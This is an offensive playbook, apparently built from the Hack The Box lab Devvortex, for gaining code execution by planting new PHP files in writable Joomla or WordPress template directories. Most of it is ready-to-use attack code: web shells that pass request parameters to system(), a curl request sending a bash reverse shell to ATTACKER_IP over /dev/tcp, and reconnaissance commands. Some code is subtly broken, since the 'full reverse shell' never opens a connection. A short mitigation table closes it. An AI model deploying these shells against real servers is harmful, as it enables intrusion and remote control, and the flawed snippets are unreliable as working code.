# CMS Template Injection Playbook

> **Purpose:** Execute code via CMS template editing when default template files are read-only.

---

## 1. What Is This Technique?

CMS template injection (also called template-based RCE) exploits the ability to modify template files within CMS platforms (Joomla, WordPress, Drupal, etc.) to inject and execute arbitrary PHP code. This technique becomes critical when:

- Default configuration files are **read-only**
- Upload directories are **writable but files execute as non-privileged users**
- The goal is **direct code execution** rather than just file write access

**Why Create New Files vs. Modify Existing?**
- Read-only existing files prevent modification
- Create new template files with malicious PHP content
- CMS loads all templates in a directory, executing the new one

---

## 2. When to Use This Technique

| Scenario | Indicator | Action |
|---|---|---|
| CMS admin panel accessible | Template editor visible | Attempt to modify/create templates |
| File write access via upload | Can upload files | Convert upload to execution via template path |
| Read-only config files | `<?php` files not writable | Create NEW template file instead |
| Template directory is writable | `ls -la` shows writable `.php` files | Write new PHP file to template directory |
| Existing templates fail to execute | No output or errors | Try creating new template with unique name |

---

## 3. How to Execute

### Step 1 — Locate Template Directory

```bash
# Common Joomla template paths
ls -la /var/www/joomla/templates/
ls -la /var/www/joomla/templates/beez3/
ls -la /var/www/joomla/templates/atomic/

# WordPress theme paths
ls -la /var/www/html/wp-content/themes/
ls -la /var/www/html/wp-content/themes/twentytwentyone/

# Generic web root
ls -la /var/www/html/templates/
ls -la /var/www/
```

### Step 2 — Identify Writable Directory

```bash
# Check write permissions
ls -la /var/www/joomla/templates/beez3/

# Test write capability
echo "test" > /var/www/joomla/templates/beez3/test.txt 2>&1 && echo "WRITABLE" || echo "READ-ONLY"

# Clean up test file
rm /var/www/joomla/templates/beez3/test.txt
```

### Step 3 — Create Malicious Template File

```bash
# PHP reverse shell template
cat > /var/www/joomla/templates/beez3/shell.php << 'EOF'
<?php
// PHP reverse shell - invoke via web request
// For interactive use, prefer system() calls in template context
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>
EOF
```

### Step 4 — Execute via HTTP Request

```bash
# Web shell execution
curl "http://target.joomla/templates/beez3/shell.php?cmd=id"

# Bind/reverse shell via template
curl "http://target.joomla/templates/beez3/shell.php?cmd=bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261"
```

### Step 5 — Alternative: System Command in Template

If file is created but web execution fails, try direct command execution within template:

```bash
cat > /var/www/joomla/templates/beez3/cmd.php << 'EOF'
<?php
// Direct command execution
system($_GET['c'] ?? 'whoami');
?>
EOF

# Then invoke
curl "http://target/cmd.php?c=whoami"
```

---

## 4. Common Commands Reference

### Discovery Phase

```bash
# Find all writable template directories
find /var/www -type d -writable 2>/dev/null | grep -i template

# List CMS templates
ls -la /var/www/*/templates/ 2>/dev/null
ls -la /var/www/html/wp-content/themes/ 2>/dev/null

# Check for known CMS
cat /var/www/html/configuration.php 2>/dev/null | grep -E "(tmp_path|log_path|dbname)"
```

### Exploitation Phase

```bash
# Create PHP web shell
cat > /path/to/writable/template/shell.php << 'EOF'
<?php system($_REQUEST['cmd']); ?>
EOF

# Create full reverse shell (if direct shell needed)
cat > /path/to/writable/template/rev.php << 'EOF'
<?php
$ip = 'ATTACKER_IP';
$port = 4444;
$shell = "/bin/bash -i";
exec("$shell -c <&4 >&4 2>&4", $out, $ret);
?>
EOF
```

### Verification

```bash
# Test web shell
curl "http://target/template/shell.php?cmd=whoami"

# Test file exists
ls -la /path/to/writable/template/shell.php
```

---

## 5. Devvortex-Specific Notes

In the Devvortex box:

```
Context: Joomla CMS with read-only default templates
Technique: Created NEW template file in writable template directory
Trigger: Direct HTTP request to new template file
```

**Key insight:** When `cat` or file viewing shows read-only `<?php` files, the solution is NOT to modify existing files — it's to CREATE a new file that the CMS will execute when accessed.

---

## 6. Troubleshooting

| Problem | Cause | Solution |
|---|---|---|
| Template file created but 403/404 | Path not accessible via web | Find correct web-accessible path |
| PHP code shows as text | `mod_php` not enabled or wrong extension | Use `.php` extension, check Apache config |
| Command runs but no output | Output buffering or error suppression | Add `2>&1` to commands, check error logs |
| Shell connects but dies immediately | Non-interactive shell | Use Python PTY stabilization |

---

## 7. Prevention/Mitigation

| Defense | Implementation |
|---|---|
| Restrict template directory permissions | `chmod 555` on template dirs, `www-data` read-only |
| Disable PHP in upload directories | `.htaccess` with `php_flag engine off` |
| File integrity monitoring | Tripwire, AIDE for template directories |
| WAF rules | Block requests with `<?php` patterns in uploads |
| Separate execution contexts | Container isolation, AppArmor profiles |

---

**Author:** Ceil (openclaw/neo workspace)  
**Source Box:** Devvortex (HTB)  
**Related:** [mysql-lateral-movement.md](./mysql-lateral-movement.md), [privesc-linux.md](./privesc-linux.md)
